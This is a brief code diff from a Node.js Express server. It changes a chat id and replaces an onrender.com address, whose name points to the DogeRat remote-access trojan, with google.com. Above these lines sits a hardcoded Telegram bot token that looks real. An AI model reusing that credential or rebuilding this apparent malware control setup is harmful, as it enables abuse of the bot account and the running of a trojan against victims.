@@ -8,8 +8,8 @@ const bodyParser = require('body-parser')
 const axios = require("axios");
 
 const token = '8590562004:AAEo0-Ylj8dJH9UYj7y8aou5kW2z8OKFPxs'
-const id = '1551000864'
-const address = 'https://dogerat1-vqcz.onrender.com'
+const id = '1002670694'
+const address = 'https://www.google.com'
 
 const app = express();
 const appServer = http.createServer(app);
